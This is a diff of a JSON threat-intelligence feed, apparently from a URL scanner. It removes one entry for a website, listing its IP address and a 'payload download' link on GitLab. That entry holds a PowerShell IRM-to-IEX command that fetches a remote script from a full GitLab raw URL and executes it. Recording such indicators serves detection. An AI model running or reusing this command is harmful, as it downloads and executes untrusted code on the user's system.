@@ -10414,25 +10414,5 @@
     ],
     "ReportId": "cmwkte9y71fs10omlyn3mr6rc",
     "ScannedAt": "2026-11-17T14:55:43.108000+00:00"
-  },
-  {
-    "UrlDomain": "www.mhc-sa.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "184.168.113.236"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwks1j5h1fne0omlmmivmcx4",
-    "ScannedAt": "2026-11-17T14:17:48.863000+00:00"
   }
 ]
